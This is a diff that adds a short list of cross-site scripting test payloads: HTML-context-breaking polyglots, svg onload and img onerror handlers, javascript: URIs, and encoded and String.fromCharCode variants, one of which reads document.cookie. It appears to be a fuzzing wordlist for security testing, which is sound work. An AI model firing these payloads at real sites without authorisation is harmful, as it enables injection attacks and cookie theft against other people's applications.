@@ -1,0 +1,14 @@
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'"><svg/onload=alert(/XSS/)>
+'"><img src=x onerror=alert(/XSS/)>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"'><script>alert(document.cookie)</script>
+--></script></style></title></textarea></noscript></template><script>alert(1)</script>
+'"()&%<acx><ScRiPt >alert(9854)</ScRiPt>
+</title></style></noscript></textarea></iframe></noembed></object><script>alert(1)</script>
+"><svg onload=alert(1)>"
+"'><img src=x onerror=alert(1)>'"
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+"><iframe src=javascript:alert(1)>
+%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
